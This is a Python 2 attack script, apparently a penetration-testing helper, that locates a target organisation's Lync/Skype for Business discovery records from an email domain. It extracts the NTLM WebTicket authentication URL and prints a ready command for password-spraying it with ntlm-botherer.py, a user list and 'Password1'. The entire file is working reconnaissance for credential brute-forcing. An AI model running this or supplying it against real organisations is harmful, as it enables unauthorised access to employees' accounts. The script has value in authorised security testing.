#!/usr/bin/python

import sys
import socket
import json, urllib2
from urllib2 import urlopen

print "\n\033[0;32m======================================================================"
print "\033[0;32mLync Discoverer and Brute-forcer helper 2016 - Written by @benpturner" 
print "\033[0;32m======================================================================"


domain = raw_input("\033[0;31mProvide an example target email address [test@example.com]: \033[0m")
domainsuffix=domain.split("@",1)[1]

print "\nLooking for Lync dicovery DNS records: "+domainsuffix+"\n"

lyncdiscoverinternal = ''
lyncdiscover = ''

try:
	lyncdiscoverinternal=socket.gethostbyname("lyncdiscoverinternal."+domainsuffix)
	print "\033[0;32m[+] Successfully resolved DNS: "+lyncdiscoverinternal+"\033[0m" 
except:
	print "\033[0;31m[-] Could not resolve DNS: "+"lyncdiscoverinternal."+domainsuffix+"\033[0m"

try:
	lyncdiscover=socket.gethostbyname("lyncdiscover."+domainsuffix)
	print "\033[0;32m[+] Successfully resolved DNS: "+lyncdiscover+"\033[0m" 
except:
	print "\033[0;31m[-] Could not resolve DNS: "+"lyncdiscover."+domainsuffix+"\033[0m"

if lyncdiscoverinternal:
	try:
		response = urlopen("http://lyncdiscoverinternal."+domainsuffix, timeout=2)
	except:
		print "Trying HTTPS"
	try:
		response = urlopen("https://lyncdiscoverinternal."+domainsuffix, timeout=2)
	except:
		print "Failed to find NTLM webpage for Lync"
	string = response.read().decode('utf-8')
	json_obj = json.loads(string)
	userlink = json_obj['_links']['user']['href']
	lyncntlm=userlink.split(domainsuffix,1)[0]
	print "\033[0;32m[+] NTLM URL for brute-forcing is: "+lyncntlm+domainsuffix+"/WebTicket/WebTicketService.svc\033[0m"
	print "\n[+] Now use: \n\033[0;32mntlm-botherer.py -U users.txt -p Password1 -d <DOMAIN> \033[0m"

if lyncdiscover:
	try:
		response = urlopen("http://lyncdiscover."+domainsuffix, timeout=2)
	except:
		pass
	try:
		response = urlopen("https://lyncdiscover."+domainsuffix, timeout=2)
	except:
		print "Failed to find NTLM webpage for Lync"
	string = response.read().decode('utf-8')
	json_obj = json.loads(string)
	userlink = json_obj['_links']['user']['href']
	lyncntlm=userlink.split(domainsuffix,1)[0]
	print "\033[0;32m[+] NTLM URL for brute-forcing is: "+lyncntlm+domainsuffix+"/WebTicket/WebTicketService.svc\033[0m"
	print "\n[+] Now use: \n\033[0;32mntlm-botherer.py -U users.txt -p Password1 -d <DOMAIN> "+lyncntlm+domainsuffix+"/WebTicket/WebTicketService.svc\033[0m"